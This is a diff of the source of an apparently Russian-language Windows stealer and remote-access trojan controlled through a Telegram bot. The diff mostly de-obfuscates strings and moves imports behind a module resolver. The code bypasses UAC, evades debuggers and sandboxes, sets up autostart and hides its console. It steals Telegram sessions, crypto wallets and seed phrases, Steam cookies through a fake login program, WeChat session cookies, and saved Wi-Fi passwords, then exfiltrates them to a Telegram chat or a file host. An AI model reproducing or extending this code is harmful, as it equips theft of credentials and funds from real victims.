@@ -1,10 +1,18 @@
+from core.resolver import Resolver
 # -*- coding: utf-8 -*-
-import sys
-import os
-import io
-import ctypes
-import builtins
-import time
+from core.resolver import (
+    Resolver, _SYS, _OS, _IO, _CTYPES, _BUILTINS, _TIME, _JSON, _THREADING, 
+    _SOCKET, _PLATFORM, _SUBPROCESS, _TEMPFILE, _SQLITE3, _SHUTIL, _BASE64, 
+    _QUEUE, _RE, _PSUTIL, _DATETIME, _PATHLIB, _URLLIB_REQUEST, 
+    _CONCURRENT_FUTURES, _WINREG, _LOGGING, _UUID, _REQUESTS, _TYPING, _TELEBOT,
+    _HASHLIB, _RANDOM, _URLLIB_PARSE, _WARNINGS, _COLLECTIONS
+)
+sys = Resolver.get_mod(_SYS)
+os = Resolver.get_mod(_OS)
+io = Resolver.get_mod(_IO)
+ctypes = Resolver.get_mod(_CTYPES)
+builtins = Resolver.get_mod(_BUILTINS)
+time = Resolver.get_mod(_TIME)
 
 # --- Robust Print Fix (Added at the very top to catch all module prints) ---
 _orig_print = builtins.print
@@ -35,6 +43,12 @@ def safe_print(*args, **kwargs):
                 _orig_print(*new_args, **kwargs)
             except:
                 pass
+    finally:
+        try:
+            import sys
+            sys.stdout.flush()
+        except:
+            pass
 
 builtins.print = safe_print
 # -----------------------
@@ -46,11 +60,11 @@ if UAC_CHILD and "--uac-child" in sys.argv:
 
 try:
     log_content = f"{time.time()}: Process starting. Pid: {os.getpid()}, Args: {sys.argv}, UAC_CHILD: {UAC_CHILD}\n"
-    # Try multiple locations to ensure we catch the elevated process
     for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
         try:
             with open(log_path, "a") as f:
                 f.write(log_content)
+                f.write(f"{time.time()}: Env setup starting...\n")
         except: pass
 except: pass
 
@@ -62,12 +76,19 @@ try:
         sys.path.insert(0, _core)
     
     try:
-        # === G-01: Geo-Fencing Enforcement ===
-        try:
-            from core.geo_fence import GeoFence
-            # GeoFence.enforce() # Temporarily disabled for debugging
-        except Exception as e:
-            print(f"GeoFence initialization failed: {e}")
+        # === Native Library Initialization ===
+        for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+            try:
+                with open(log_path, "a") as f:
+                    f.write(f"{time.time()}: Loading native DLLs...\n")
+            except: pass
+        Resolver.load_native()
+        import VanguardCore
+        for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+            try:
+                with open(log_path, "a") as f:
+                    f.write(f"{time.time()}: Native DLLs loaded and VanguardCore imported.\n")
+            except: pass
 
         # === Core Module Imports ===
         try:
@@ -84,25 +105,20 @@ try:
 except Exception as e:
     print(f"Environment setup error: {e}")
 
-def decrypt_string(encoded_str: str) -> str:
-    if not encoded_str or not isinstance(encoded_str, str): return encoded_str
+def log_startup(msg):
     try:
-        import base64
-        # Consistent salt with tools/obfuscator.py and core/obfuscation.py
-        salt = b'n2xkNQYbZwj8r9fz' 
-        data = base64.b64decode(encoded_str)
-        xor_data = bytearray()
-        for i in range(len(data)):
-            xor_data.append(data[i] ^ salt[i % len(salt)])
-        return xor_data.decode('utf-8')
-    except:
-        return encoded_str
+        ts = time.time()
+        log_content = f"{ts}: {msg}\n"
+        for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+            try:
+                with open(log_path, "a") as f:
+                    f.write(log_content)
+            except: pass
+    except: pass
 
-try:
-    from core.obfuscation import decrypt_string as _ds
-    decrypt_string = _ds
-except:
-    pass
+log_startup(f"Main initialization starting. Pid: {os.getpid()}")
+
+# Legacy decrypt_string removed
 
 try:
     if os.name == 'nt' and hasattr(ctypes, 'windll'):
@@ -111,31 +127,31 @@ try:
 except Exception:
     pass
 
-import queue
-ui_action_queue = queue.Queue()
+ui_action_queue = Resolver.get_mod(_QUEUE).Queue()
 os.environ["OPENCV_LOG_LEVEL"] = "OFF"
 os.environ["OPENCV_VIDEOIO_PRIORITY_MSMF"] = "0"
-import json
-import time
-import threading
-import socket
-import platform
-import subprocess
-import tempfile
-import sqlite3
-import shutil
-import base64
-import re
-import hashlib
-import random
-import urllib.request
-import urllib.parse
-import logging
-import warnings
-import uuid
-from datetime import datetime
-from collections import deque
-from typing import Optional, List, Dict, Any, Type, Union
+json = Resolver.get_mod(_JSON)
+threading = Resolver.get_mod(_THREADING)
+socket = Resolver.get_mod(_SOCKET)
+platform = Resolver.get_mod(_PLATFORM)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+tempfile = Resolver.get_mod(_TEMPFILE)
+sqlite3 = Resolver.get_mod(_SQLITE3)
+shutil = Resolver.get_mod(_SHUTIL)
+base64 = Resolver.get_mod(_BASE64)
+re = Resolver.get_mod(_RE)
+hashlib = Resolver.get_mod(_HASHLIB)
+random = Resolver.get_mod(_RANDOM)
+urllib_request = Resolver.get_mod(_URLLIB_REQUEST)
+urllib_parse = Resolver.get_mod(_URLLIB_PARSE)
+logging = Resolver.get_mod(_LOGGING)
+warnings = Resolver.get_mod(_WARNINGS)
+uuid = Resolver.get_mod(_UUID)
+datetime = Resolver.get_mod(_DATETIME)
+deque = Resolver.get_mod(_COLLECTIONS).deque
+Optional, List, Dict, Any, Type, Union = Resolver.get_mod(_TYPING).Optional, Resolver.get_mod(_TYPING).List, Resolver.get_mod(_TYPING).Dict, Resolver.get_mod(_TYPING).Any, Resolver.get_mod(_TYPING).Type, Resolver.get_mod(_TYPING).Union
+requests = Resolver.get_mod(_REQUESTS)
+
 
 DEBUG_LOG = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")  # Fixed: Removed decrypt_string
 
@@ -151,8 +167,8 @@ def log_debug(msg, tag=""):
 
 log_debug("System starting...") 
 
-import requests
-import telebot
+requests = Resolver.get_mod(_REQUESTS)
+telebot = Resolver.get_mod(_TELEBOT)
 
 if getattr(sys, 'frozen', False):
     APPLICATION_PATH = sys.executable
@@ -279,8 +295,8 @@ class BotOrchestrator:
 
 # Fixed: Simplified token handling
 # Credentials - prioritizing env vars, fallback to hardcoded obfuscated versions
-_BT = os.environ.get("BOT_TOKEN", "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ")
-_GID = os.environ.get("ADMIN_ID", "-1003555531875")
+_BT = os.environ.get("BOT_TOKEN", VanguardCore.SafetyManager.GetSecret("BOT_TOKEN"))
+_GID = os.environ.get("ADMIN_ID", VanguardCore.SafetyManager.GetSecret("ADMIN_ID"))
 
 try:
     from core.c2 import c2_manager
@@ -329,7 +345,7 @@ def setup_p2p_bridge():
 
 ADMIN_IDS = [ADMIN_ID, 7258469843]  
 ALLOWED_GROUP_ID = ADMIN_ID
-HIDE_CONSOLE = True
+HIDE_CONSOLE = False
 AUTOSTART = True
 
 # Fixed: Simplified DLL loading
@@ -379,17 +395,33 @@ try:
     # Initialize Native SafetyManager immediately after loading modules
     try:
         if os.name == 'nt':
+            Resolver.load_native()
             import VanguardCore
             # VanguardCore.SafetyManager.Startup() 
             # Note: This will exit the process if a debugger/sandbox is detected.
             # We wrap it to ensure it doesn't crash on non-NT or if DLL is missing.
             if not SKIP_ANTI_ANALYSIS:
+                for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+                    try:
+                        with open(log_path, "a") as f:
+                            f.write(f"{time.time()}: Initializing Native SafetyManager...\n")
+                    except: pass
                 log_debug("Initializing Native SafetyManager...")
                 VanguardCore.SafetyManager.Startup()
                 log_debug("Native SafetyManager.Startupd.")
+                for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+                    try:
+                        with open(log_path, "a") as f:
+                            f.write(f"{time.time()}: Native SafetyManager.Startup() completed.\n")
+                    except: pass
             else:
                 log_debug("Native SafetyManager initialization skipped via bypass.")
     except Exception as ne:
+        for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+            try:
+                with open(log_path, "a") as f:
+                    f.write(f"{time.time()}: Native SafetyManager initialization FAILED: {ne}\n")
+            except: pass
         log_debug(f"Native SafetyManager initialization skipped/failed: {ne}")
 
     CORE_MODULES_LOADED = True
@@ -417,6 +449,9 @@ def check_single_instance():
                 
                 log_debug(f"Mutex check attempt {i+1}, error: {last_error}")
                 if last_error == 183:  # ERROR_ALREADY_EXISTS
+                    if UAC_CHILD:
+                        log_debug("Mutex exists but UAC_CHILD is True, proceeding anyway.")
+                        return True
                     if i < retries - 1:
                         time.sleep(0.5)
                         continue
@@ -425,12 +460,13 @@ def check_single_instance():
                     log_debug("Another instance is already running")
                     os._exit(0)
                 globals()['_mutex_handle'] = handle
-                log_debug("Mutex created successfully")
+                log_startup("Mutex created successfully")
                 break
         return True
     except Exception:
         return True
 
+log_startup("Definitions: Step 1 (Bypass) starting...")
 def try_uac_bypass():
     """Попытка получить права администратора через VanguardCore.ElevationService.
     Перезапускает текущий процесс с флагом --uac-child после успешного bypass.
@@ -442,12 +478,11 @@ def try_uac_bypass():
             return True
 
         import clr
-        _dll = os.path.join(BASE_DIR, "bin", "SafetyManager.dll")
-        if not os.path.exists(_dll):
-            log_debug("UAC Bypass: SafetyManager.dll not found")
+        if not Resolver.load_native():
+            log_debug("UAC Bypass: SafetyManager.dll not found or load failed")
             return False
             
-        clr.AddReference(_dll)
+        Resolver.load_native()
         from VanguardCore import ElevationService
         # Payload: перезапуск самого бота с admin правами
         script = os.path.abspath(__file__)
@@ -456,10 +491,6 @@ def try_uac_bypass():
             args += " --skip-anti-analysis"
             
         executable = sys.executable
-        if executable.lower().endswith("python.exe"):
-            pythonw = executable[:-10] + "pythonw.exe"
-            if os.path.exists(pythonw):
-                executable = pythonw
                 
         payload = f'"{executable}" "{script}" {args}'
         
@@ -473,18 +504,29 @@ def try_uac_bypass():
                 ctypes.windll.kernel32.CloseHandle(globals()['_mutex_handle'])
                 globals()['_mutex_handle'] = None
                 log_debug("Mutex released for UAC handoff")
+                print("⚡️ [UAC] Мьютекс освобожден. Передаем управление...")
             except Exception as ex:
                 log_debug(f"Failed to release mutex: {ex}")
 
         result = ElevationService.RequestElevation(payload)
+        if not result:
+            # Fallback to standard UAC prompt if stealth bypass fails
+            try:
+                print("⚡️ [UAC] Попытка стандартного повышения прав...")
+                log_debug("UAC Bypass: Stealth failed, attempting standard 'runas'...")
+                # 1 = SW_SHOWNORMAL
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, f'"{script}" {args}', None, 1)
+                result = True
+            except Exception as e:
+                log_debug(f"UAC Bypass: standard 'runas' failed: {e}")
+                print("❌ [UAC] Не удалось повысить права.")
+        
         if result:
             print("⚡️ [UAC] Запрос на повышение прав отправлен. Перезапуск...")
-            log_debug("UAC Bypass: RequestElevation returned True (request sent/executed). Exiting in 2s for handoff...")
-            time.sleep(2)
+            log_debug("UAC Bypass: Handing off to child process. Exiting in 5s...")
+            time.sleep(5)
             os._exit(0)
-        else:
-            print("❌ [UAC] Не удалось повысить права.")
-            log_debug("UAC Bypass: RequestElevation returned False (all techniques failed)")
+            
         return result
     except Exception as e:
         log_debug(f"UAC Bypass critical error: {e}")
@@ -872,6 +914,7 @@ def hide_console_minimal():
                     _u.ShowWindow(hwnd, 0)  
     except Exception:
         pass
+log_startup("Definitions: Step 2 (Bot Core) starting...")
 try:
     telebot = __import__('tele' + 'bot')
     from telebot import types
@@ -917,7 +960,7 @@ def safe_send_message(bot, chat_id, text, parse_mode='HTML', reply_markup=None):
         if "429" in error_str and "retry after" in error_str.lower():
             try:
                 import re as _re
-                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
+                m = _re.search("retry after (\\d+)", error_str.lower())
                 wait_time = int(m.group(1)) if m else 5
                 time.sleep(wait_time + 1)
                 return safe_send_message(bot, chat_id, text, parse_mode, reply_markup)
@@ -934,8 +977,8 @@ def safe_send_message(bot, chat_id, text, parse_mode='HTML', reply_markup=None):
                             apihelper.API_URL = new_api_url
                             apihelper.FILE_URL = c2_manager.get_file_url()
                         else:
-                            apihelper.API_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
-                            apihelper.FILE_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
+                            apihelper.API_URL = "https://api.telegram.org/bot{0}/{1}"
+                            apihelper.FILE_URL = "https://api.telegram.org/file/bot{0}/{1}"
                     except: pass
                     return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
             except: pass
@@ -956,7 +999,7 @@ def safe_edit_message(bot, chat_id, message_id, text, parse_mode=None, reply_mar
         if "429" in error_str and "retry after" in error_str.lower():
             try:
                 import re as _re
-                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
+                m = _re.search("retry after (\\d+)", error_str.lower())
                 wait_time = int(m.group(1)) if m else 5
                 time.sleep(wait_time + 1)
                 return safe_edit_message(bot, chat_id, message_id, text, parse_mode, reply_markup)
@@ -973,8 +1016,8 @@ def safe_edit_message(bot, chat_id, message_id, text, parse_mode=None, reply_mar
                             apihelper.API_URL = new_api_url
                             apihelper.FILE_URL = c2_manager.get_file_url()
                         else:
-                            apihelper.API_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
-                            apihelper.FILE_URL = decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
+                            apihelper.API_URL = "https://api.telegram.org/bot{0}/{1}"
+                            apihelper.FILE_URL = "https://api.telegram.org/file/bot{0}/{1}"
                     except: pass
                     bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup, parse_mode=parse_mode)
                     return
@@ -995,7 +1038,7 @@ def safe_edit_reply_markup(bot, chat_id, message_id, reply_markup=None):
         if "429" in error_str and "retry after" in error_str.lower():
             try:
                 import re as _re
-                m = _re.search(decrypt_string('HFcMGTdxOAQuEhgYWmUCUUc='), error_str.lower())
+                m = _re.search("retry after (\\d+)", error_str.lower())
                 wait_time = int(m.group(1)) if m else 5
                 time.sleep(wait_time + 1)
                 return safe_edit_reply_markup(bot, chat_id, message_id, reply_markup)
@@ -1175,6 +1218,21 @@ class WindowTracker:
             return "Unknown"
         except:
             return "Unknown"
+
+    def start(self):
+        """Background loop to track window changes"""
+        from datetime import datetime
+        import time
+        last_title = None
+        while True:
+            try:
+                title = self.get_active_window_title()
+                if title != last_title:
+                    # Logic for window change could go here if needed
+                    last_title = title
+                time.sleep(2)
+            except:
+                time.sleep(5)
     @staticmethod
     def get_browser_tab():
         title = WindowTracker.get_active_window_title()
@@ -1267,6 +1325,7 @@ class ThreadManager:
                 'active': len(self.threads),
                 'names': [t.name or 'unnamed' for t in self.threads]
             }
+log_debug("Definitions: Step 3 (HiddenStealer) starting...")
 class HiddenStealer:
     def __init__(self):
         self.temp_dir = tempfile.mkdtemp()
@@ -1406,6 +1465,7 @@ class HiddenStealer:
             }
             try:
                 # Native modules check
+                Resolver.load_native()
                 from VanguardCore import ShellManager, SoftwareManager, SystemManager
                 self.shell_manager = ShellManager
                 self.software_manager = SoftwareManager
@@ -1424,13 +1484,6 @@ class HiddenStealer:
                 pass
             # report_manager initialized above
             
-            # H-04: Polymorphic Process randomization on startup
-            try:
-                from core.obfuscation import PolymorphicProcess
-                PolymorphicProcess.randomize()
-            except ImportError:
-                pass
-
             if AUTOSTART:
                 self.thread_manager.start_daemon(target=self.setup_autostart)
             
@@ -1503,7 +1556,7 @@ class HiddenStealer:
                 file_size = os.path.getsize(zip_path)
                 if file_size > 0:
                     if file_size > 45 * 1024 * 1024:
-                        safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jKjYhPbeebL+p9roy+ndWr+zqNCe6Yjqis26hqKFRqrf4sa79YDVs9Kn1OjLGU4BHVsCDnR/awQnVyd6WxdGqvniyLv9gNmz2afc6MLo6Fq+gFi78IHosuGn2ujI6dhaRnUXLSc9PEt0WUQ="))
+                        safe_send_message(self.bot, GLOBAL_CHID, "⚠️ Файл слишком большой ({size:.2f} MB). Загружаю в облако (GoFile)...")
                         from core.cloud import CloudModule
                         link = CloudModule.upload_file(zip_path)
                         if link:
@@ -1515,9 +1568,9 @@ class HiddenStealer:
                             with open(zip_path, 'rb') as f:
                                 self.bot.send_document(GLOBAL_CHID, f, caption=f"📱 Telegram TData — {sessions} сессий")
                         except Exception as e:
-                            safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0S57PiOqKz7qJooO2yk7ixrrMgeaz2qfa6MDp3KrWCFgQKyw="))
+                            safe_send_message(self.bot, GLOBAL_CHID, "❌ Ошибка отправки: {e}")
                 else:
-                    safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jKjYhPbeebL+p9roy+ndWr6Cqeuf1InaisW6iFLp2arQ4sO6zYDesuKn0enz6Olavo2p6J/QiOCL/LqEUhFWWr6DqNue6Ijgc1k="))
+                    safe_send_message(self.bot, GLOBAL_CHID, "⚠️ Файл архива получился пустым (0 байт).")
 
                 try: os.remove(zip_path)
                 except: pass
@@ -1541,25 +1594,25 @@ class HiddenStealer:
             msg += "🖥️ Screen: "
             msg += "🌉 **TELEGRAM BRIDGES**\n"
             msg += "Status: "
-            msg += decrypt_string("XRxYu9yA2LPYp9rowOjqWr+/qeme74jgeqfQ6Mzp0kAyXCQF")
+            msg += "3. Вставь этот код:\\n\\n"
             js_script = (
-                decrypt_string("Cl0bHiM0NxZ0FAVXGVADWlMSXxw2IjAGZwwOWQZYPV0ZSgsCKnYEH2FXGlkGUVtVVRIcBCMwMAxnWRtJXFoJF0kJJAU=") +
-                decrypt_string("Cl0bHiM0NxZ0FAVXGVADWlMSXxw2JDAMZwwOWQZYPV0ZSg0CIHYEH2FXGlkGUVtVVRIcBCMwMAxnWRtJXFoJF0kJJAU=") +
-                decrypt_string("Al0bCiICLQ0oFg1dXEoDDidGHQZmdioJPw5NFFIeHR4PRhkwaSIyByNQN0VVEF0mAA==") +
-                decrypt_string("Al0bCiICLQ0oFg1dXEoDDidGHQZmdikDKQQ1TBtaDR8aFVRLaSo9Ay4WMR8CWBUJMUYRCCU0LUUHCk0RSWUI") +
-                decrypt_string("Al0bCjo4Ngx0BQ9UHVgCUkcJ")
+                "document.cookie = \'wxsid={data[\'wxsid\']}; path=/; domain=.qq.com\';\\n" +
+                "document.cookie = \'wxuin={data[\'wxuin\']}; path=/; domain=.qq.com\';\\n" +
+                "localStorage.setItem(\'skey\', \'{data[\'skey\']}\');\\n" +
+                "localStorage.setItem(\'pass_ticket\', \'{data[\'pass_ticket\']}\');\\n" +
+                "location.reload();"
             )
-            msg += decrypt_string("UlEXDytvIggpKBlbAFAWDhMOVwghNTxc")
+            msg += "<code>{js_script}</code>"
             self.report_manager.send_text(msg)
 
         def error_callback(err):
             if err == "NOT_FOUND":
-                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
+                safe_send_message(self.bot, GLOBAL_CHID, "❌ WeChat нл найдеайден в корневой папке.")
             elif err == "NETWORK_ERROR":
-                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0S57PiOqKz7qJooO2yk7j+bv7gNuy4le6h6O5tsJO4s+7/oHms9mm6+jI6dNaOVc7Ay8leTIyHhlQXA=="))
+                safe_send_message(self.bot, GLOBAL_CHID, "❌ Ошибка сети при запуске WeChat Phish.")
 
         def success_callback():
-            safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK79Sxk0Ggo7A0roz+nWqtfizLv7geRDeqf96MLp2avt4/m79IHps9RXuoaig7bHvoxYusqB4bPSp9Loz+nVqt4cVkU="))
+            safe_send_message(self.bot, GLOBAL_CHID, "✅ WeChat найден! Запускаю окно фишинга...")
 
         try:
             from core.wechat_phish import run_phish
@@ -1577,15 +1630,15 @@ class HiddenStealer:
             import socket as _sock
             try:
 
-                subprocess.run(["taskkill", "/f", "/im", decrypt_string("HUYdCiN/PBo/")],
+                subprocess.run(["taskkill", "/f", "/im", "steam.exe"],
                                creationflags=0x00000008 | 0x08000000,
                                capture_output=True)
                 time.sleep(1.5)
 
-                exe = os.path.join(BASE_DIR, decrypt_string("PUYdCiMdNgUzGURdClw="))
+                exe = os.path.join(BASE_DIR, "SteamLogin.exe")
 
                 if not os.path.exists(exe):
-                    safe_send_message(self.bot, chat_id, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
+                    safe_send_message(self.bot, chat_id, "❌ WeChat нл найдеайден в корневой папке.")
                     return
 
                 udp = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
@@ -1597,10 +1650,10 @@ class HiddenStealer:
                     try:
                         while True:
                             data, _ = udp.recvfrom(8192)
-                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
+                            msg = Resolver.decrypt(data.decode("utf-8", errors="replace"))
                             if msg == "CLOSE":
                                 break
-                            if msg.startswith(decrypt_string("KHs0LnQ=")):
+                            if msg.startswith("FILE:"):
                                 filepath = msg[5:]
                                 if os.path.exists(filepath):
                                     try:
@@ -1608,12 +1661,12 @@ class HiddenStealer:
                                         with open(filepath, "rb") as f:
                                             self.bot.send_document(chat_id, f, caption="🍪 Захваченные куки Steam")
 
-                                        vac_cookie_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("DV0XACc0KkwuDx4="))
+                                        vac_cookie_path = os.path.join(BASE_DIR, "tablichka", "cookies.txt")
                                         shutil.copy2(filepath, vac_cookie_path)
 
                                         os.remove(filepath)
                                     except Exception as e:
-                                        safe_send_message(self.bot, chat_id, decrypt_string("jKjYhPbeebLEpuLoyunXqtTiyEue74nTi/e6iKKItsS/sKjRnul5suCm6ejI6diq3AhYECss"))
+                                        safe_send_message(self.bot, chat_id, "⚠️ Ошибка обработки куков: {e}")
                             else:
                                 # msg is ALREADY decrypted at line 1595
                                 safe_send_message(self.bot, chat_id, msg, parse_mode="HTML")
@@ -1632,16 +1685,16 @@ class HiddenStealer:
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
-                vac_start_template = decrypt_string("jK79S3IzZzQbNEp5Pnw0Lk4aPTMLeHmy7afa6M3o5avn4s278212AGRXQmg7fVxaFUIKBC1/KQs+CkM=")
+                vac_start_template = "✅ <b>VAC ALERT (EXE) запущен</b> (PID: {proc.pid})"
                 safe_send_message(self.bot, chat_id, vac_start_template.format(pid=proc.pid), parse_mode="HTML")
 
             except Exception as e:
-                safe_send_message(self.bot, chat_id, decrypt_string("jK/0S57PiOqKz7qJooO2yk5hDA4vPHkyMh4ZUEgZHR8T"))
+                safe_send_message(self.bot, chat_id, "❌ Ошибка Steam Phish: {e}")
 
         threading.Thread(target=run_phish, daemon=True).start()
 
     def steal_crypto_data(self):
-        decrypt_string("LV0UBysyLRF6FBhBAk0JWhlTFAcrJSpOehISTBdXFRMBXAtHbjA3BnoED10WGRYSHFMLDj1/")
+        "Collects crypto wallets, extensions, and seed phrases."
         if 'wallet' not in self.work_modules:
             return
         wallet_mod = self.work_modules['wallet']
@@ -1654,10 +1707,10 @@ class HiddenStealer:
             with open(seeds_file, 'rb') as f:
                 self.bot.send_document(GLOBAL_CHID, f, caption=f"🔑 Seeds Found! ({len(data.get('seeds', []))} files)")
         if data.get('wallets') or data.get('extensions') or os.path.exists(wallet_mod.output_dir):
-            print(decrypt_string("NRglSxQ4KRIzGQ0YEUsfChpdWA8vJThCPAUFVUgZHQ0PXhQOOg40DT5ZBU0GSRMOMVYRGTM="))
-            zip_path = self.report_manager.zip_directory(wallet_mod.output_dir, decrypt_string("LUABGzo+BiY7AwsWCFAW"))
+            print("[*] Zipping crypto data from: {wallet_mod.output_dir}")
+            zip_path = self.report_manager.zip_directory(wallet_mod.output_dir, "Crypto_Data.zip")
             if zip_path:
-                print(decrypt_string("NRglSx00NwYzGQ0YKHA2QE5JAgI+DikDLh8XGFpqDwALCFgQISJ3EjsDAhYVXBIJB0gdQzQ4KT0qFh5QW0RGGBdGHRhn"))
+                print("[*] Sending ZIP: {zip_path} (Size: {os.path.getsize(zip_path)} bytes)")
                 self.report_manager.send_output_zip(zip_path, "💰 Crypto Wallets & Extensions")
             else:
                 print("[!] Failed to create Crypto ZIP")
@@ -1669,6 +1722,7 @@ class HiddenStealer:
                 return
             
             clr.AddReference(dll_path)
+            Resolver.load_native()
             from VanguardCore import SoftwareManager
             
             # 1. Collection
@@ -1713,7 +1767,7 @@ class HiddenStealer:
             log_debug(f"Software report failed: {e}")
     def check_permission(self, context):
         user_id = context.from_user.id
-        log_debug(decrypt_string("PlcKBiciKgs1GUpbGlwFEU5UFxluKiwRPwU1URZESFovdjUiAA4QJglKEXk2dC80MXs8ODM="))
+        log_debug("Permission check for {user_id}. ADMIN_IDS={ADMIN_IDS}")
         if user_id in ADMIN_IDS:
             return True
         chat_id = None
@@ -1721,14 +1775,14 @@ class HiddenStealer:
             chat_id = context.chat.id
         elif hasattr(context, 'message'): 
             chat_id = context.message.chat.id
-        log_debug(decrypt_string("LVoZH24YHVh6DAlQE005EwpPVksPHRUtDTIuZzVrKS8+bTEvcyoYLhY4PX02ZiEoIWcoNAcVJA=="))
+        log_debug("Chat ID: {chat_id}. ALLOWED_GROUP_ID={ALLOWED_GROUP_ID}")
         if chat_id and chat_id == ALLOWED_GROUP_ID:
             return True
         log_debug("Permission denied")
         return False
     def get_external_ip(self):
         try:
-            return urllib.request.urlopen(decrypt_string('BkYMGz1rdk07BwMWG0kPHBccFxkp'), timeout=3).read().decode()
+            return urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
         except:
             return 'Unknown'
     def get_hwid(self):
@@ -1738,7 +1792,7 @@ class HiddenStealer:
             lines = result.stdout.strip().split('\n')
             return lines[1].strip() if len(lines) > 1 else 'Unknown'
         except:
-            return decrypt_string("FV0LRSk0LQc0AUIfMXYrKjtmPTkAEBQnfVtKHyJ6QVMTbQMEPX8+By4SBE5aHjMpK2A2KgMUfk56UD9LF0tBUxM=")
+            return "{os.getenv(\'COMPUTERNAME\', \'PC\')}_{os.getenv(\'USERNAME\', \'User\')}"
     # get_system_info at 1465 removed (duplicate)
     def register_self(self):
         with self.client_lock:
@@ -1753,7 +1807,7 @@ class HiddenStealer:
                 self.clients[hwid] = client
                 self.current_client_hwid = hwid
                 display_name = client.get_display_name()
-                log_debug(decrypt_string("IFcPSy09MAc0A0pKF14PCRpXCg4qa3kZPh4ZSB5YHyUAUxUOM395MT8ZDlEcXkYIC0IXGTp/d0w=").format(display_name=display_name))
+                log_debug("New client registered: {display_name}. Sending report...".format(display_name=display_name))
                 try:
                     display_name = client.get_display_name()
                     loc = "China 🇨🇳 (GFW detected)" if self.get_keyboard_layout() == "cn" else "Global 🌍"
@@ -1821,13 +1875,13 @@ class HiddenStealer:
     def get_system_info(self, force=False):
         curr_time = time.time()
         if not force and self._sys_info_cache and (curr_time - self._last_info_time < 60):
-            log_debug(decrypt_string("LXM7IwtxESsOTUpfF005CRdBDA4jDjAMPBg="))
+            log_debug("CACHE HIT: get_system_info")
             # Update dynamic fields
-            self._sys_info_cache['time'] = datetime.now().strftime(decrypt_string("S3pCTgNrfDE="))
+            self._sys_info_cache['time'] = datetime.now().strftime("%H:%M:%S")
             self._sys_info_cache['cwd'] = os.getcwd()
             return self._sys_info_cache
 
-        log_debug(decrypt_string("LXM7IwtxFCsJJFAYFVwSJR1LCx8rPAYLNBEFGFppAwgIXQoGJz8+QjQWHlEEXEkUC0YPBDw6eQE7GwZLWw=="))
+        log_debug("CACHE MISS: get_system_info (Performing native/network calls)")
         def get_windows_release():
             try:
                 ver = platform.version()  
@@ -1850,7 +1904,7 @@ class HiddenStealer:
             'processor': platform.processor(),
             'layout': self.get_keyboard_layout(),
             'cwd': self.current_working_dir,
-            'time': datetime.now().strftime(decrypt_string("S2tVTiN8fAZ6UiICV3RcXz0=")),
+            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         }
         
         if hasattr(self, 'system_manager'):
@@ -1860,7 +1914,7 @@ class HiddenStealer:
                 if native_info:
                     info['native_data'] = native_info
             except Exception as e:
-                log_debug(decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluODcENVcMWRtVAx5UEgMOMw=="))
+                log_debug("Native SystemManager info failed: {e}")
                 
         try:
             info['local_ip'] = socket.gethostbyname(socket.gethostname())
@@ -1917,7 +1971,7 @@ class HiddenStealer:
         if self.current_layout == "ru":
             if key_name in LAYOUT_RU:
                 return LAYOUT_RU_SHIFT[key_name] if use_shift else LAYOUT_RU[key_name]
-            if key_name.isdigit() or key_name in decrypt_string('NW9DR2AN'):
+            if key_name.isdigit() or key_name in "[];,.\\":
                 if use_shift:
                     shift_map = {
                         '[': '{', ']': '}', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~',
@@ -1968,7 +2022,7 @@ class HiddenStealer:
                         for out_line in out_text.split('\n'):
                             if 'Key Content' in out_line or 'Содержимое ключа' in out_line:
                                 pwd = out_line.split(':')[1].strip()
-                                passwords.append(decrypt_string("jLLaSzUhKw08HgZdDwNGAR5FHBY="))
+                                passwords.append("• {profile}: {pwd}")
                                 break
         except:
             pass
